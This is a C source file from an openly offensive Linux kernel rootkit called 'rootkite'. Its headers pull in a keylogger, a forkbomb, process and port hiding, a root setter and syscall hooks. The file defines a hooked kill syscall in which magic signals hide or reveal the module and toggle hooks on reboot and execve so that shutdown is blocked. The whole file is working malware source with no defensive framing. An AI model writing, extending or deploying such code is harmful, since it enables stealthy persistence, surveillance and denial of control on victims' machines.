#include "device_handler.h"
#include "mod_hider.h"
#include "root_setter.h"
#include "getdents_hacks.h"
#include "hide_process.h"
#include "hide_ports.h"
#include "files_hacks.h"
#include "netfilter_kite.h"
#include "forkbomb.h"
#include "keylogger.h"
#include "kite_hook.h"
#include "execve_blocker.h"



#ifdef PTREGS_SYSCALL_STUB
static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self explanatory, in the README, activate and hook desired capabilities
    int sig = regs->si;
    int pid = regs->di;
    if ((sig == 64) && (pid == 1))
    {
        if(hidden == 0){
            printk(KERN_INFO "Hide rootkite\n");
            hide_mod();
        }
        else{
            printk(KERN_INFO "Show rootkite\n");
            show_mod();
        }
    }
    else if ((sig == 64) && (pid == 2)){
        // hide chardev quickly
        return 0;
    }
    else if ((sig == 63) && (pid == 2)){
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_reboot") == 1){
            printk(KERN_ERR "error hooking syscall %d\n", __NR_reboot);
        }
        if(is_hook_activated(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_execve") == 1){
            insert_node(&exec_to_block, "shutdown");
        }
        else{
            remove_node_by_name(&exec_to_block, "shutdown");
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_execve") == 1){
                printk(KERN_ERR "error hooking syscall execve\n");
        }
    }
    return orig_kill(regs);
}
#else
static asmlinkage long hack_kill(pid_t pid, int sig){
    if ((sig == 64) && (pid == 1))
    {
        if(hidden == 0){
            printk(KERN_INFO "Hide rootkite\n");
            hide_mod();
        }
        else{
            printk(KERN_INFO "Show rootkite\n");
            show_mod();
        }
    }
    else if ((sig == 63) && (pid == 2)){
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_reboot") == 1){
            printk(KERN_ERR "error hooking syscall %d\n", __NR_reboot);
        }
        if(is_hook_activated(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_execve") == 1){
            insert_node(&exec_to_block, "shutdown");
        }
        else{
            remove_node_by_name(&exec_to_block, "shutdown");
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_execve") == 1){
                printk(KERN_ERR "error hooking syscall execve\n");
        }
    }
    return orig_kill(pid, sig);
}
#endif
